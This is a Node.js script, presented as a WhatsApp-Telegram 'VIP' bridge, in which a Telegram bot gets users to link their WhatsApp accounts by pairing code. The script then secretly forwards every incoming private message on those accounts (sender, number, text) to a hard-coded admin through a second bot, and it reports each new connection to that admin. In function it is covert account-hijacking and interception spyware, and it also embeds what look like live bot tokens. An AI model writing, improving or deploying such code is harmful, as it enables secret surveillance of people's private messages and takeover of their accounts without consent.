/**
 * 👑 WHATSAPP-TELEGRAM BRIDGE [VIP20 GLOBAL FIXED]
 * --------------------------------------------------------
 * Precision Fix: Pairing Code Logic, Browser ID, Stability
 */

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeCacheableSignalKeyStore,
    getContentType,
    Browsers,
    delay
} = require("@whiskeysockets/baileys");
const { Telegraf, session } = require("telegraf");
const pino = require("pino");
const fs = require("fs-extra");
const path = require("path");

const logger = pino({ level: "silent" });

// --- ⚙️ إعدادات النسخة الملكية ---
const VIP_CONFIG = {
    PAIRING_TOKEN: "8578288620:AAFVW35qKVRPHMmKrPacqejWlupE5OgM3qI", 
    CONTROL_TOKEN: "8584722590:AAHFV8u4XZlBPNJ0uD4bHVosXY71bP3hPA4",
    ADMIN_ID: "8510615418",
    SESSIONS_DIR: "./all_sessions"
};

// التأكد من وجود المجلد
fs.ensureDirSync(VIP_CONFIG.SESSIONS_DIR);

class VIPEngine {
    constructor() {
        this.activeSessions = new Map();
        // إعداد البوتات
        this.bot1 = new Telegraf(VIP_CONFIG.PAIRING_TOKEN);
        this.bot2 = new Telegraf(VIP_CONFIG.CONTROL_TOKEN);
        
        this.bot2.use(session());
        this.init();
    }

    async init() {
        console.log("🦁 STARTING VIP ENGINE...");
        this.setupHandlers();

        // استعادة الجلسات المحفوظة
        if (fs.existsSync(VIP_CONFIG.SESSIONS_DIR)) {
            const dirs = fs.readdirSync(VIP_CONFIG.SESSIONS_DIR);
            for (const dir of dirs) {
                if (dir.startsWith('user-')) {
                    const phone = dir.replace('user-', '');
                    console.log(`[Resume] Reloading session: ${phone}`);
                    this.startWhatsApp(phone);
                }
            }
        }
        
        // تشغيل البوتات وتجاهل أخطاء التكرار
        this.bot1.launch({ dropPendingUpdates: true }).catch(e => console.error("Bot1 Error:", e));
        this.bot2.launch({ dropPendingUpdates: true }).catch(e => console.error("Bot2 Error:", e));
        
        console.log("🦁 VIP SYSTEM ONLINE - READY FOR PAIRING");
        this.notifyAdmin("🖥 <b>النظام يعمل الآن</b>\nتم تشغيل المحرك بنجاح.");
    }

    async startWhatsApp(phone, ctx = null) {
        const sessionDir = path.join(VIP_CONFIG.SESSIONS_DIR, `user-${phone}`);
        
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger)
            },
            logger,
            // 🛡️ استخدام متصفح Ubuntu Chrome هو الأكثر استقراراً للكود حالياً
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            printQRInTerminal: false,
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: true,
            syncFullHistory: false,
            retryRequestDelayMs: 2000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000
        });

        this.activeSessions.set(phone, sock);

        // ==========================================
        // 🚀 إصلاح دقيق لمنطق طلب كود الربط
        // ==========================================
        if (ctx && !sock.authState.creds.registered) {
            // انتظار تهيئة السوكيت (ضروري جداً)
            await delay(3000);

            try {
                // 1. تنظيف الرقم من أي شوائب
                const cleanPhone = phone.replace(/[^0-9]/g, '');
                
                if (cleanPhone.length < 10) {
                    await ctx.reply("❌ الرقم يبدو قصيراً جداً، تأكد من الرقم الدولي.");
                    return;
                }

                await ctx.reply(`⏳ جاري طلب الكود للرقم: +${cleanPhone}...`);

                // 2. طلب الكود
                const code = await sock.requestPairingCode(cleanPhone);
                
                // 3. تنسيق الكود ليظهر بشكل XXXX-XXXX
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;

                // 4. إرسال الكود
                await ctx.replyWithHTML(
                    `🦁 <b>كود الربط الخاص بك:</b>\n\n` +
                    `<code>${formattedCode}</code>\n\n` +
                    `⚠️ انسخ الكود وضعه في واتساب خلال دقيقة.`
                );

            } catch (err) {
                console.error("Pairing Error:", err);
                
                if (String(err).includes("resource-limit")) {
                    await ctx.reply("❌ محاولات كثيرة جداً. انتظر قليلاً وحاول مجدداً.");
                } else {
                    await ctx.reply("❌ حدث خطأ أثناء طلب الكود. تأكد أن الرقم صحيح وليس محظوراً.");
                }
                
                // تنظيف الجلسة الفاشلة
                sock.end(undefined);
                fs.removeSync(sessionDir);
            }
        }

        // حفظ الاعتمادات
        sock.ev.on('creds.update', saveCreds);

        // مراقبة حالة الاتصال
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = reason !== DisconnectReason.loggedOut;

                console.log(`[${phone}] Connection Closed: ${reason}`);

                if (shouldReconnect) {
                    this.startWhatsApp(phone);
                } else {
                    console.log(`[${phone}] Logged Out. Cleaning up...`);
                    this.activeSessions.delete(phone);
                    fs.removeSync(sessionDir);
                    if(ctx) ctx.reply("⚠️ تم تسجيل الخروج من الجلسة.");
                }
            } else if (connection === 'open') {
                console.log(`[${phone}] CONNECTED ✅`);
                this.notifyAdmin(`🚀 <b>اتصال جديد</b>\nرقم: <code>${phone}</code>\nالحالة: متصل ✅`);
                if (ctx) await ctx.reply("✅ تم الربط بنجاح! البوت متصل الآن.");
            }
        });

        // استقبال الرسائل وتحويلها
        sock.ev.on('messages.upsert', async (m) => {
            if (m.type !== 'notify') return;
            for (const msg of m.messages) {
                if (!msg.message) continue;
                this.handleForward(phone, msg);
            }
        });
    }

    // دالة تحويل الرسائل للمطور
    handleForward(phone, msg) {
        if (msg.key.fromMe) return; // تجاهل رسائل البوت نفسه
        
        const jid = msg.key.remoteJid;
        const isGroup = jid.endsWith('@g.us');
        if (isGroup) return; // تجاهل المجموعات (اختياري)

        const name = msg.pushName || "Unknown";
        const type = getContentType(msg.message);
        
        let content = "";
        if (type === 'conversation') content = msg.message.conversation;
        else if (type === 'extendedTextMessage') content = msg.message.extendedTextMessage.text;
        else content = `[${type}]`;

        if (!content) return;

        const report = `📨 <b>رسالة واردة (${phone})</b>\n` +
                       `👤: ${name}\n` +
                       `🆔: <code>${jid.split('@')[0]}</code>\n` +
                       `💬: ${content}`;

        this.bot2.telegram.sendMessage(VIP_CONFIG.ADMIN_ID, report, { parse_mode: 'HTML' }).catch(() => {});
    }

    setupHandlers() {
        // أوامر بوت الربط
        this.bot1.start((ctx) => ctx.reply("👋 أهلاً بك في نظام VIP.\nأرسل /pair +رقمك لربط واتساب."));
        
        this.bot1.command('pair', (ctx) => {
            const text = ctx.message.text;
            const num = text.split(' ')[1];

            if (!num) return ctx.reply("⚠️ يرجى كتابة الرقم بعد الأمر.\nمثال: /pair 966500000000");

            // تنظيف الرقم من البداية
            const cleanNum = num.replace(/[^0-9]/g, "");
            
            if (this.activeSessions.has(cleanNum)) {
                return ctx.reply("⚠️ هذا الرقم متصل بالفعل.");
            }

            this.startWhatsApp(cleanNum, ctx);
        });

        // أوامر بوت التحكم
        this.bot2.start((ctx) => {
            if (ctx.from.id.toString() === VIP_CONFIG.ADMIN_ID) {
                ctx.reply("👑 أهلاً بك سيدي المطور في لوحة التحكم.");
            }
        });
    }

    notifyAdmin(text) {
        this.bot2.telegram.sendMessage(VIP_CONFIG.ADMIN_ID, text, { parse_mode: 'HTML' }).catch(err => {
            console.error("Failed to notify admin:", err.message);
        });
    }
}

// تشغيل النظام
new VIPEngine();
